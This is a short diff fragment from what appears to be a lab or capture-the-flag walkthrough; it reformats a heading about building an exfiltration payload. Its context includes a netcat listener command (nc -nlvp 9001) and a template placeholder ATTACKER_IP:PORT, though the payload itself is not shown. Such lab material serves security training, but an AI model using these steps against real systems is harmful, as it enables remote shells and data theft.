@@ -200,7 +200,7 @@ nc -nlvp 9001
 
 ---
 
-6. Build an exfiltration payload 
+##6. Build an exfiltration payload##
 
 Template — replace ATTACKER_IP:PORT with your AttackBox IP and listening port:
 
